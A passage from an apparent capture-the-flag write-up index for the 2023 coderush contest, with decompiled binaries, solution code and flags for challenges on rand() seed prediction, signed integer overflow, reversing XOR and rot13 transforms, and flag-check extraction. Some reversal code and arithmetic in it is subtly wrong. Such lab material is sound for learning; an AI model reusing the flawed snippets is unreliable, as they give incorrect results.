overflow"]},{"location":"writeups/2023/coderush/index.html#seed","title":"Seed","text":"","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#description_1","title":"Description","text":"<p>Let's play a game where I guess a number and you tell what it is. If you can correctly tell me what my guess is I will give you my precious flag.</p> <p><code>nc 139.59.0.163 5336</code></p> <p>flag format: <code>coderush{fl4g}</code></p> <p>Author: <code>gr007</code></p> <p>seed</p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#solution_1","title":"Solution","text":"<p>We are given a binary seed file. Let's load it up with Ghidra.</p> Decompiled <pre><code>int main(void)\n{\n    uint __seed;\n    int r;\n    long in_FS_OFFSET;\n    int input;\n    int i;\n    FILE *file;\n    char flag [72];\n    long local_10;\n\n    local_10 = *(in_FS_OFFSET + 40);\n    __seed = rand();\n    srand(__seed);\n    puts(\"How many seeds do i have?\");\n    for (i = 0; i &lt; 100; i += 1) {\n        __isoc99_scanf(&amp;PTR_DAT_00102022,&amp;input);\n        r = rand();\n        if (r % 100000 != input) {\n            puts(&amp;PTR_DAT_00102022 + 3);\n                    /* WARNING: Subroutine does not return */\n            exit(0);\n        }\n        puts(\"You must be lucky\");\n    }\n    file = fopen(\"flag.txt\",\"r\");\n    if (file == NULL) {\n        puts(\"flag not found.\");\n        puts(\"If you are running this on the remote server, contact the admin immediately.\");\n        puts(\n            \"If you are running this on your local machine, create a flag.txt with a dummy flag for  debugging purpose.\"\n            );\n        fflush(stdout);\n                    /* WARNING: Subroutine does not return */\n        exit(0);\n    }\n    fgets(flag,59,file);\n    printf(\"It cannot be!\\n(;_;)\\nMy precious flag: %s\\n\",flag);\n    if (local_10 != *(in_FS_OFFSET + 40)) {\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n    }\n    return 0;\n}\n</code></pre> <p>So, What we need to do is match with the server and output the same random number that the server generates. This is pretty easy. We just need to know one basic thing that the sequence of random numbers depends on the seed that is given to the random number generator. The c random number generator always defaults to some seed for which the random number that it starts with is always the same no matter the hardware or software. Thus, the first random number is always the same. If that number is used as seed, we get the same sequence. let us generate the same sequence by re-producing the main function in <code>sol.c</code>.</p> <p></p> <p></p> <p>flag: <code>coderush{t0d@y_@_533d_70m0rr0w_@7r33}</code></p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#three-sum","title":"Three Sum","text":"","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#description_2","title":"Description","text":"<p>I hope ye'all have done this challenge where you sum up two numbers. But don't you think that <code>three</code> makes a lot more sense than <code>two</code>? We will make things right by adding up three numbers to make it awe sum.</p> <p>Access the server with: <code>nc 139.59.0.163 3555</code></p> <p>flag format: <code>coderush{fl4g}</code></p> <p>Author: <code>gr007</code></p> <p>chal</p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#solution_2","title":"Solution","text":"<p>We are given a binary. Let's load it into Ghidra.</p> Decompiled <pre><code>int overflew(int sum,int n1,int n2,int n3){\n    int r;\n\n    if ((((n1 &lt; 1) || (n2 &lt; 1)) || (n3 &lt; 1)) || (0 &lt; sum)) {\n        r = 0;\n    }\n    else {\n        r = 1;\n    }\n    return r;\n}\n\nint main(void){\n    int s;\n    long in_FS_OFFSET;\n    uint n1;\n    uint n2;\n    uint n3;\n    int sum;\n    FILE *file;\n    char flag [72];\n    long local_10;\n\n    local_10 = *(in_FS_OFFSET + 40);\n    puts(\"n1 &gt; n1 + n2 + n3 AND n2 &gt; n1 + n2 + n3 AND n3 &gt; n1 + n2 + n3\");\n    fflush(stdout);\n    puts(\"What three positive numbers can make this possible: \");\n    fflush(stdout);\n    s = __isoc99_scanf(&amp;DAT_0010207d,&amp;n1);\n    if (s != 0) {\n        s = __isoc99_scanf(&amp;DAT_0010207d,&amp;n2);\n        if (s != 0) {\n            s = __isoc99_scanf(&amp;DAT_0010207d,&amp;n3);\n            if (s != 0) {\n                printf(\"You entered %d, %d and %d\\n\",n1,n2,n3);\n                fflush(stdout);\n                sum = n3 + n1 + n2;\n                s = overflew(sum,n1,n2,n3);\n                if (s != 0) {\n                    puts(\"You have an integer overflow.\");\n                    fflush(stdout);\n                    /* WARNING: Subroutine does not return */\n                    exit(0);\n                }\n                puts(\"Is there no overflow?\");\n                puts(\"OR is the cpu trippin?\");\n                fflush(stdout);\n                if ((((sum &lt; n1) &amp;&amp; (sum &lt; n2)) &amp;&amp; (sum &lt; n3)) &amp;&amp;\n                (((0 &lt; n1 &amp;&amp; (0 &lt; n2)) &amp;&amp; (0 &lt; n3)))) {\n                    file = fopen(\"flag.txt\",\"r\");\n                    if (file == NULL) {\n                        puts(\"flag not found.\");\n                        puts(\n                            \"If you are running this on the remote server, contact the admin immedia tely.\"\n                            );\n                        puts(\n                            \"If you are running this on your local machine, create a flag.txt with a  dummy flag for debugging purpose.\"\n                            );\n                        fflush(stdout);\n                    /* WARNING: Subroutine does not return */\n                        exit(0);\n                    }\n                    fgets(flag,59,file);\n                    printf(\"YOUR FLAG IS: %s\\n\",flag);\n                    fflush(stdout);\n                    /* WARNING: Subroutine does not return */\n                    exit(0);\n                }\n                puts(\"Then again, where is the flag?\");\n            }\n        }\n    }\n    if (local_10 != *(in_FS_OFFSET + 40)) {\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n    }\n    return 0;\n}\n</code></pre> <p>The program does nothing out of ordinary. It takes Three integers as input, adds them up and checks if the result has caused any overflow or not with the <code>overflew</code> function. The way it checks for overflow is by the following condition: <code>(((n1 &lt; 1) || (n2 &lt; 1)) || (n3 &lt; 1)) || (0 &lt; sum)</code>. So, by this function, overflow occurs if either the sum is less than 0 or any one of the numbers is less than 1. By sane logic it might be hard to get that how can you add three poisitive integers greater than 0 but still get a sum greater than zero that is somehow less than any one of the integers that were added. But if we talk about computers, <code>meh</code>.</p> <p>Integers are 32 bit long. if the result is to be greater than zero then the <code>sign</code> bit needs to be zero in the result. Now, how can we do it? Let's look at the following example for 8 bit signed integer:</p> <p><code>0b01100000</code> =&gt; <code>n1</code></p> <p><code>0b01100000</code> =&gt; <code>n2</code></p> <p><code>0b01000000</code> =&gt; <code>n3</code></p> <p><code>0b00000000</code> =&gt; <code>sum</code></p> <p>how this happens? well the original result would be: <code>0b100000000</code> in <code>9</code> bit. But the extra 1 has to be removed. Now, we are left with only 0 as sum. Thus having sum less than any of the given numbers. The same logic applies for 32bit integers. So, to get 0 as sum, we need any three positive numbers whose sum add up to at least <code>2&lt;&lt;32 + 1</code> as the sum needs to be greater than zero.</p> <p></p> <p>flag: <code>coderush{1_5um_2_5um_3_5um_@we_5um}</code></p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#chocolate-cake","title":"Chocolate Cake","text":"","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#description_3","title":"Description","text":"<p>I found the best recipe for Cake in the world. But this recipe needs a secret ingredient which I don't know. Help me discover the hidden secrets of this recipe and I will make the best cake for you.</p> <p>You can access the kitchen with <code>nc 139.59.0.163 1740</code></p> <p>flag format: <code>coderush{fl4g}</code></p> <p>Author: <code>gr007</code></p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#solution_3","title":"Solution","text":"<p>The recipe wants a secret ingredient when executed. Let's see what we can see in Ghidra. I have done some light renaming and so on. now let's try to recreate the recipe. It's pretty amazing how much similar the decompiled source is compared to the actual source code.</p> Decompiled <pre><code>byte taste_cake(char *cake)\n\n{\n    int i;\n    char some_cake [23];\n    byte f;\n\n    some_cake._0_8_ = 0x1070426e70144e3c;\n    some_cake._8_7_ = 0x5413116e370e29;\n    some_cake[15] = 0x74;\n    some_cake._16_7_ = 0x6a356833540227;\n    f = 1;\n    for (i = 0; i &lt; secret_len; i += 1) {\n        f &amp;= cake[i] == some_cake[i];\n    }\n    if (*(in_FS_OFFSET + 40) != *(in_FS_OFFSET + 40)) {\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n    }\n    return f;\n}\n\nvoid serve_the_cake(char *cake)\n\n{\n    int tasty;\n    FILE *file;\n    long in_FS_OFFSET;\n    char flag [72];\n    long local_10;\n\n    local_10 = *(in_FS_OFFSET + 40);\n    tasty = taste_cake(cake);\n    if (tasty != 1) {\n        puts(\"You cannot just make a secret ingredient up. (-_-)\");\n                    /* WARNING: Subroutine does not return */\n        exit(0);\n    }\n    file = fopen(\"flag.txt\",\"r\");\n    if (file == NULL) {\n        puts(\"file not found\\n\");\n        puts(\"If you are on a remote server contact the admin asap.\");\n        puts(\"If you are on your local machine, create a flag.txt so that you can debug easily.\");\n                    /* WARNING: Subroutine does not return */\n        exit(1);\n    }\n    fgets(flag,64,file);\n    puts(flag);\n    if (local_10 != *(in_FS_OFFSET + 40)) {\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n    }\n    return;\n}\n\nvoid bake_and_frost(char *secret_ingredient)\n\n{\n    int i;\n    int j;\n\n    puts(\"bakin...\");\n    puts(\"done...\");\n    for (i = 0; i &lt; 2 &lt;&lt; (secret_len &amp; 31); i += 1) {\n        for (j = 0; j &lt; secret_len; j += 1) {\n            secret_ingredient[j] =\n                secret_ingredient[j] ^ secret_ingredient[(j + secret_len + -1) % secret_len];\n        }\n    }\n    puts(\"frostin...\");\n    puts(\"done...\");\n    return;\n}\n\nvoid whisk_and_mix(char *secret_ingredient)\n\n{\n    int i;\n    int j;\n    int k;\n\n    puts(\"whiskin...\");\n    puts(\"done\");\n    for (i = 0; i &lt; secret_len / 2; i += 1) {\n        for (j = 0; j &lt; secret_len; j += 1) {\n            secret_ingredient[j] =\n                secret_ingredient[j] ^ secret_ingredient[(j + secret_len + -1) % secret_len];\n            k = (j + secret_len + -1) % secret_len;\n            secret_ingredient[k] = secret_ingredient[k] ^ secret_ingredient[j];\n            secret_ingredient[j] =\n                secret_ingredient[j] ^ secret_ingredient[(j + secret_len + -1) % secret_len];\n        }\n    }\n    puts(\"mixin...\");\n    puts(\"done\");\n    return;\n}\n\nvoid prepare(char *secret_ingredient)\n\n{\n    int i;\n\n    puts(\"prepin...\");\n    for (i = 0; i &lt; secret_len; i += 1) {\n        secret_ingredient[i] =\n            secret_ingredient[i] + -84 + ((secret_ingredient[i] + -84) / 26) * -26 + 'a';\n    }\n    puts(\"done\");\n    return;\n}\n\n\nchar * bake_a_cake(char *secret_ingredient)\n\n{\n    long in_FS_OFFSET;\n    int i;\n    code *recipe [3];\n    long local_10;\n\n    local_10 = *(in_FS_OFFSET + 40);\n    recipe[0] = prepare;\n    recipe[1] = whisk_and_mix;\n    recipe[2] = bake_and_frost;\n    for (i = 0; i &lt; 3; i += 1) {\n        (*recipe[i])(secret_ingredient);\n    }\n    if (local_10 != *(in_FS_OFFSET + 40)) {\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n    }\n    return secret_ingredient;\n}\n\n\nint main(void)\n\n{\n    char c;\n    size_t sVar1;\n    char *cake;\n    long in_FS_OFFSET;\n    int i;\n    char secret_ingredient [40];\n    long local_10;\n\n    local_10 = *(in_FS_OFFSET + 40);\n    puts(\"The best cake has the best of secret ingredients\");\n    puts(\"What is your best secret ingredient?\");\n    read(1,secret_ingredient,32);\n    for (i = 0; i &lt; 32; i += 1) {\n        if (secret_ingredient[i] == '\\n') {\n            c = '\\0';\n        }\n        else {\n            c = secret_ingredient[i];\n        }\n        secret_ingredient[i] = c;\n    }\n    sVar1 = strlen(secret_ingredient);\n    secret_len = sVar1;\n    if (secret_len != 23) {\n        puts(\"You are not someone who is supposed to know the super secret ingredient.\");\n                    /* WARNING: Subroutine does not return */\n        exit(0);\n    }\n    cake = bake_a_cake(secret_ingredient);\n    serve_the_cake(cake);\n    if (local_10 != *(in_FS_OFFSET + 40)) {\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n    }\n    return 0;\n}\n</code></pre>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#function-breakdown","title":"Function breakdown","text":"","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#main","title":"main","text":"Main <pre><code>int main(){\n    char c;\n    size_t sVar1;\n    char *cake;\n    long in_FS_OFFSET;\n    int i;\n    char secret_ingredient [40];\n    long local_10;\n\n    local_10 = *(in_FS_OFFSET + 40);\n    puts(\"The best cake has the best of secret ingredients\");\n    puts(\"What is your best secret ingredient?\");\n    read(1,secret_ingredient,32);\n    for (i = 0; i &lt; 32; i += 1) {\n        if (secret_ingredient[i] == '\\n') {\n            c = '\\0';\n        }\n        else {\n            c = secret_ingredient[i];\n        }\n        secret_ingredient[i] = c;\n    }\n    sVar1 = strlen(secret_ingredient);\n    secret_len = sVar1;\n    if (secret_len != 23) {\n        puts(\"You are not someone who is supposed to know the super secret ingredient.\");\n                    /* WARNING: Subroutine does not return */\n        exit(0);\n    }\n    cake = bake_a_cake(secret_ingredient);\n    serve_the_cake(cake);\n    if (local_10 != *(in_FS_OFFSET + 40)) {\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n    }\n    return 0;\n}\n</code></pre> <p>The main function takes the <code>secret_ingredient</code> using read function. Then checks for length. So, we know that the length of the secret_ingredient is 23. then there is a call to <code>bake_a_cake(secret_ingredient)</code>. the function returns a <code>cake</code> and the <code>cake</code> is then served by <code>serve_the_cake(cake)</code> function. We now write a function that will do the opposite of what the main function does in another main function. <pre><code>int main(){\n    char* cake = get_a_cake();  //get the cake from serve_the_cake(cake) function\n    char* secret_ingredient = cake_a_bake(cake);\n    preserve(secret_ingredient);\n}\n</code></pre> As we saw in <code>serve_the_cake</code> function, the function compares the output of <code>bake_a_cake</code> with a premade cake inside <code>taste_cake</code> and returns 1 or 0. so, we can later just take the cake from taste_cake function and find out the secret_ingredient from the cake.</p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#bake_a_cake","title":"bake_a_cake","text":"Bake_a_cake <pre><code>char* bake_a_cake(char* secret_ingredient){\n    long in_FS_OFFSET;\n    int i;\n    code *recipe [3];\n    long local_10;\n\n    local_10 = *(in_FS_OFFSET + 40);\n    recipe[0] = prepare;\n    recipe[1] = whisk_and_mix;\n    recipe[2] = bake_and_frost;\n    for (i = 0; i &lt; 3; i += 1) {\n        (*recipe[i])(secret_ingredient);\n    }\n    if (local_10 != *(in_FS_OFFSET + 40)) {\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n    }\n    return secret_ingredient;\n}\n</code></pre> <p>It has an interesting type that is <code>code*</code> for those of you who do not know, <code>code*</code> is basically a function pointer. How code pointer is function pointer is not the part of discussion. This function first initializes an array of function pointers with addresses of functions in order. Then using a for loop, the functions are being called by giving the secret_ingredient as a parameter to the function. These functions use the secret_ingredient and then returns the secret ingredient as cake. Now, let's write a function that will take a <code>cake</code> as input and will give a <code>secret_ingredient</code> as output.</p> <pre><code>char* cake_a_bake(char* cake){\n    void (*recipe[3])(char*) = {defrost_and_dake, seperate_and_dwadle, wait};\n    for(int i = 0; i&lt; 3; i++){\n        (*recipe[i])(cake);\n    }\n    return cake;\n}\n</code></pre>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#prepare","title":"prepare","text":"Prepare <pre><code>char* prepare(char* secret_ingredient){\n    int i;\n\n    puts(\"prepin...\");\n    for (i = 0; i &lt; secret_len; i += 1) {\n        secret_ingredient[i] =\n            secret_ingredient[i] + -84 + ((secret_ingredient[i] + -84) / 26) * -26 + 'a';\n    }\n    puts(\"done\");\n    return;\n}\n</code></pre> <p>we see a loop that modifies our secret_ingredient. At first, it looks like whatever is happening inside the loop  does not look good. But if you look closely, if we take <code>secret_ingredient[i]-84</code> as <code>z</code>, the expression becomes: <pre><code>secret_ingredient[i] = z - (z / 26) * 26 + 'a'\n</code></pre> I don't know if any of you ever found reminder using the above method, but i did. We can rewrite the above expression as follows: <pre><code>secret_ingredient[i] = z % 26 + 'a'\n</code></pre> Now, seeing 26 as the constant, we can assume that the output of <code>secret_igredient[i]</code> is also going to be a character but something added to 'a'. Now, let's breakdown <code>z</code>.</p> <p><code>z = secret_ingredient[i] - 84</code></p> <p>I wanted to see what happens to the characters after this whole transformation of <code>prepare</code> function. Look what I found:</p> <p></p> <p>The function does <code>rot13</code> on each characters. so, another simple rot13 would bring back the input from the output. Now, it's time to write <code>wait</code> function as designed by cake_a_bake function: <pre><code>void wait(char* cake){\n    for(int i=0;i&lt;secret_len;i++){\n        cake[i] = 'a' + (cake[i]-84)%26;\n    }\n}\n</code></pre></p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#whisk_and_mix","title":"whisk_and_mix","text":"Whisk_and_mix <pre><code>void whisk_and_mix(char* secret_ingredient){\n    int i;\n    int j;\n    int k;\n\n    puts(\"whiskin...\");\n    puts(\"done\");\n    for (i = 0; i &lt; secret_len / 2; i += 1) {\n        for (j = 0; j &lt; secret_len; j += 1) {\n            secret_ingredient[j] =\n                secret_ingredient[j] ^ secret_ingredient[(j + secret_len + -1) % secret_len];\n            k = (j + secret_len + -1) % secret_len;\n            secret_ingredient[k] = secret_ingredient[k] ^ secret_ingredient[j];\n            secret_ingredient[j] =\n                secret_ingredient[j] ^ secret_ingredient[(j + secret_len + -1) % secret_len];\n        }\n    }\n    puts(\"mixin...\");\n    puts(\"done\");\n    return;\n}\n</code></pre> <p>Our secret_len/2 is 11. so, the outer loop loops 11 times. the inner loop runs for every characters in the secret_ingredient. Let's see what happens in the inner loop after cleaning a bit: <pre><code>k = (j+secret_len -1) % secret_len;\nsecret_ingredient[j] ^= secret_ingredient[k];\nsecret_ingredient[k] ^= secret_ingredient[j];\nsecret_ingredient[j] ^= secret_ingredient[k];\n</code></pre> for j=0; k=secret_len-1; and the inside working is inplace swapping of the jth character with it's previous character. So, after swapping all characters in the inner loop, the whole secret_ingredient is cyclic shifted left by one character. And it occurs 11 times. So, to revert our original secret ingredient, we need to cyclic right shift 11 times. The <code>separate_and_dwadle</code> function can be written as:</p> <pre><code>void separate_and_deadle(char* cake){\n    for(int i=0;i&lt;secret_len/2;i++){\n        for(int j=secret_len-1;j&gt;=0;j--){\n            k = (j+secret_len -1) % secret_len;\n            cake[j] ^= cake[k];\n            cake[k] ^= cake[j];\n            cake[j] ^= cake[k];\n        }\n    }\n}\n</code></pre>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#bake_and_frost","title":"bake_and_frost","text":"Bake_and_frost <pre><code>void bake_and_frost(char* secret_ingredient){\n    int i;\n    int j;\n\n    puts(\"bakin...\");\n    puts(\"done...\");\n    for (i = 0; i &lt; 2 &lt;&lt; (secret_len &amp; 31); i += 1) {\n        for (j = 0; j &lt; secret_len; j += 1) {\n            secret_ingredient[j] =\n                secret_ingredient[j] ^ secret_ingredient[(j + secret_len + -1) % secret_len];\n        }\n    }\n    puts(\"frostin...\");\n    puts(\"done...\");\n    return;\n}\n</code></pre> <p>The bake and frost function does the following to every characters of the secret_ingredient from first to last 2^23 times: <pre><code>secret_ingredient[j] ^= secret_ingredient[(j + secret_len - 1) % secret_len];\n</code></pre> Each char in secret_ingredient is xored with it's previous char. To reverse this, we write the following function: <pre><code>void defrost_and_dake(char* cake){\n    for(int i=0;i&lt;(2&lt;&lt;23);i++){\n        for(int j=secret_len-1;j&gt;=0;j--){\n            cake[i] ^= cake[(j + secret_len - 1) % secret_len];\n        }\n    }\n}\n</code></pre></p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#serve_the_cake-and-taste_cake","title":"serve_the_cake and taste_cake","text":"Serve_the_cake <pre><code>void serve_the_cake(char* cake){\n    int tasty;\n    FILE *file;\n    long in_FS_OFFSET;\n    char flag [72];\n    long local_10;\n\n    local_10 = *(in_FS_OFFSET + 40);\n    tasty = taste_cake(cake);\n    if (tasty != 1) {\n        puts(\"You cannot just make a secret ingredient up. (-_-)\");\n                    /* WARNING: Subroutine does not return */\n        exit(0);\n    }\n    file = fopen(\"flag.txt\",\"r\");\n    if (file == NULL) {\n        puts(\"file not found\\n\");\n        puts(\"If you are on a remote server contact the admin asap.\");\n        puts(\"If you are on your local machine, create a flag.txt so that you can debug easily.\");\n                    /* WARNING: Subroutine does not return */\n        exit(1);\n    }\n    fgets(flag,64,file);\n    puts(flag);\n    if (local_10 != *(in_FS_OFFSET + 40)) {\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n    }\n    return;\n}\n</code></pre> <p>this function is our target. upon successfully getting 1 from taste_cake, we will recieve the flag.txt from the server.</p> Taste_cake <pre><code>byte taste_cake(char* cake){\n    int i;\n    char some_cake [23];\n    byte f;\n\n    some_cake._0_8_ = 0x1070426e70144e3c;\n    some_cake._8_7_ = 0x5413116e370e29;\n    some_cake[15] = 0x74;\n    some_cake._16_7_ = 0x6a356833540227;\n    f = 1;\n    for (i = 0; i &lt; secret_len; i += 1) {\n        f &amp;= cake[i] == some_cake[i];\n    }\n    if (*(in_FS_OFFSET + 40) != *(in_FS_OFFSET + 40)) {\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n    }\n    return f;\n}\n</code></pre> <p>Though it feels weird, the 23 consecutive bytes in some_cake needs to be extracted byte by byte for us to reconstruct the cake. We have to take note of endianness and reverse each 8 bytes to get the correct order.</p> <p>Now, the <code>get_cake</code> function will be as follows: <pre><code>char* get_cake(){\n    char* some_cake = (char*)malloc(sizeof(char) * 23);\n    some_cake[0] = 0x3c;\n    some_cake[1] = 0x4e;\n    some_cake[2] = 0x14;\n    some_cake[3] = 0x70;\n    some_cake[4] = 0x6e;\n    some_cake[5] = 0x42;\n    some_cake[6] = 0x70;\n    some_cake[7] = 0x10;\n    some_cake[8] = 0x29;\n    some_cake[9] = 0x0e;\n    some_cake[10] = 0x37;\n    some_cake[11] = 0x6e;\n    some_cake[12] = 0x11;\n    some_cake[13] = 0x13;\n    some_cake[14] = 0x54;\n    some_cake[15] = 0x74;\n    some_cake[16] = 0x27;\n    some_cake[17] = 0x02;\n    some_cake[18] = 0x54;\n    some_cake[19] = 0x33;\n    some_cake[20] = 0x68;\n    some_cake[21] = 0x35;\n    some_cake[22] = 0x6a;\n    return some_cake;\n}\n</code></pre> We now pass the cake to cake_a_bake and then get a secret_ingredient. we then preserve the secret_ingredient.</p> <pre><code>void preserve(char* secret_ingredient){\n    for(int i=0; i&lt;secret_len;i++){\n        printf(\"%c\",secret_ingredient[i]);\n    }\n}\n</code></pre> <p>Now, we have all the required to retrieve the secret_ingredient from the cake. the following c file computes the secret_ingredient from the cake.</p> <p>secret</p> <p>Now, we hit a wall of disappointment.</p> <p></p> <p>We can assume that we messed up somewhere bigtime. But upon further observation of the reversal code, everything seems to be okay. But there is a catch. all the letters in the input are rotated whether they are between <code>a</code> and <code>z</code> or not. My guess is that there were some characters in the secret_ingredient that were not in the range <code>a~z</code> so, rot13 becomes reversible for only those who were between <code>a~z</code> and irreversible for those who were not. Now, we change the secret code a little in our recipe, we do the following: <pre><code>char* cake_a_bake(char* cake){\n    void (*recipe[3])(char*) = {defrost_and_dake, seperate_and_dwadle, wait};\n    for(int i = 0; i&lt; 2; i++){\n        (*recipe[i])(cake);\n    }\n    return cake;\n}\n</code></pre> This way, we will now get the secret ingredient before it was rotated. The string we get is: <code>\\hcZel\\ZpeZ^lXateZqXZa^</code> we head over to cyberchef and only do rot13 on characters.</p> <p>The string we get is: <code>\\upMry\\McrM^yKngrMdKMn^</code></p> <p>The previous secret we go was: <code>iupgryigcrgkyengrgdegnk</code></p> <p>If we compare the two, we can see that some characters appear at exactly the same position as the other one. Now, we keep them as they are highly likely the original characters, not the 1337 converted to characters. <code>_up_ry__cr__y_ngr_d__n_</code>.</p> <p>Not too clear what it exactly means. Now, we need to make a cake of only most probable 1337 codes to guess what 1337 code was used for the recipe. We make the following change in the code of 1 <code>cake_a_bake</code>:</p> <p>When we put <code>134570!@_</code> in wait, we get the following output: <code>XZ[\\^WHMl</code>; Now, we can replace occurances of any of <code>XZ[\\^WHMl</code> with it's corresponding 1337 code in <code>\\hcZel\\ZpeZ^lXateZqXZa^</code>. After adding it with <code>_up_ry__cr__y_ngr_d__n_</code> we get: <code>5up3ry53cr37y1ngr3d13n7</code>. aslo, see that both <code>l</code> and <code>_</code> are converted to <code>y</code> upon rot13. so, we can safely assume that the secret was: <code>5up3r_53cr37_1ngr3d13n7</code>.</p> <p>Annd voila we got our flag:</p> <p></p> <p>flag: <code>coderush{7h3_c@k3_w@5_5up3r_d3l15h}</code></p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#nest","title":"Nest","text":"","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#description_4","title":"Description","text":"<p>Winter fades, spring awakes, The cuckoo sings, the earth shakes, Summer's near, but first a rest, A nest to build, with utmost zest.</p> <p></p> <p>flag format: <code>coderush{fl4g}</code></p> <p>Author: <code>gr007</code></p> <p>nest</p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#solution_4","title":"Solution","text":"<p>We are given a binary ELF x64 executable. it asks for an input. presumably for the flag. after opening the file in ghidra and renaming a couple of variables, we get the following c like source code:</p> Decompiled <pre><code>/* DISPLAY WARNING: Type casts are NOT being printed */\n\nundefined8 main(void)\n\n{\n    char c;\n    long in_FS_OFFSET;\n    int i;\n    char flag [40];\n    long local_10;\n\n    local_10 = *(in_FS_OFFSET + 40);\n    read(1,flag,37);\n    for (i = 0; i &lt; 37; i += 1) {\n        if (flag[i] == '\\n') {\n            c = '\\0';\n        }\n        else {\n            c = flag[i];\n        }\n        flag[i] = c;\n    }\n    if (flag[36] == '}' &amp;&amp;\n        (flag[6] == 's' &amp;&amp;\n        (flag[25] == '5' &amp;&amp;\n        (flag[2] == 'd' &amp;&amp;\n        (flag[27] == '1' &amp;&amp;\n        (flag[0] == 'c' &amp;&amp;\n        (flag[21] == 'c' &amp;&amp;\n        (flag[17] == 'n' &amp;&amp;\n        (flag[4] == 'r' &amp;&amp;\n        (flag[29] == '_' &amp;&amp;\n        (flag[20] == '_' &amp;&amp;\n        (flag[13] == '0' &amp;&amp;\n        (flag[32] == 'r' &amp;&amp;\n        (flag[11] == 'c' &amp;&amp;\n        (flag[3] == 'e' &amp;&amp;\n        (flag[30] == '5' &amp;&amp;\n        (flag[26] == '_' &amp;&amp;\n        (flag[15] == '_' &amp;&amp;\n        (flag[8] == '{' &amp;&amp;\n        (flag[35] == 'g' &amp;&amp;\n        (flag[28] == 'n' &amp;&amp;\n        (flag[16] == '0' &amp;&amp;\n        (flag[18] == 'l' &amp;&amp;\n        (flag[24] == '3' &amp;&amp;\n        (flag[22] == '0' &amp;&amp;\n        (flag[23] == 'm' &amp;&amp;\n        (flag[31] == 'p' &amp;&amp;\n        (flag[14] == '0' &amp;&amp;\n        (flag[1] == 'o' &amp;&amp;\n        (flag[33] == '1' &amp;&amp;\n        (flag[12] == 'k' &amp;&amp;\n        (flag[10] == 'u' &amp;&amp;\n        (flag[5] == 'u' &amp;&amp;\n        (flag[7] == 'h' &amp;&amp; (flag[9] == 'c' &amp;&amp; (flag[34] == 'n' &amp;&amp; flag[19] == 'y')))))))))))))))))))\n        ))))))))))))))))) {\n        puts(\"Yes! That\\'s the saying.\");\n    }\n    else {\n        puts(\"No, that\\'s not the saying.\");\n    }\n    if (local_10 != *(in_FS_OFFSET + 40)) {\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n    }\n    return 0;\n}\n</code></pre> <p>So, from the source code, it is obvious that the flags characters are being checked without order. we bring it in order or just write the following c code to get the flag: <pre><code>int main(){\n    char flag [41];\n    flag[36] = '}';\n    flag[6] = 's';\n    flag[25] = '5';\n    flag[2] = 'd';\n    flag[27] = '1';\n    flag[0] = 'c';\n    flag[21] = 'c';\n    flag[17] = 'n';\n    flag[4] = 'r';\n    flag[29] = '_';\n    flag[20] = '_';\n    flag[13] = '0';\n    flag[32] = 'r';\n    flag[11] = 'c';\n    flag[3] = 'e';\n    flag[30] = '5';\n    flag[26] = '_';\n    flag[15] = '_';\n    flag[8] = '{';\n    flag[35] = 'g';\n    flag[28] = 'n';\n    flag[16] = '0';\n    flag[18] = 'l';\n    flag[24] = '3';\n    flag[22] = '0';\n    flag[23] = 'm';\n    flag[31] = 'p';\n    flag[14] = '0';\n    flag[1] = 'o';\n    flag[33] = '1';\n    flag[12] = 'k';\n    flag[10] = 'u';\n    flag[5] = 'u';\n    flag[7] = 'h';\n    flag[9] = 'c';\n    flag[34] = 'n';\n    flag[19] = 'y';\n    puts(flag);\n    return 0;\n}\n</code></pre></p> <p>flag : <code>coderush{cuck00_0nly_c0m35_1n_5pr1ng}</code></p>","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#keasy","title":"Keasy","text":"","tags":["coderush","pwn","rev","format string vulnerability","integer overflow"]},{"location":"writeups/2023/coderush/index.html#description_5","title":"Description","text":"<p>I am a fan of random numbers. I encrypted the flag with a random key. I then threw the key into the <code>/dev/null</code> blackhole. Now I can't retrieve the flag. But I heard your team specializes in retrieving keys from there.</p> <p>Like Napoleon Once said: <code>Give me the key. I shall give you the flag.</code></p> <p>This file has the encrypted flag in it. You can also use this file to decrypt the flag.</p> 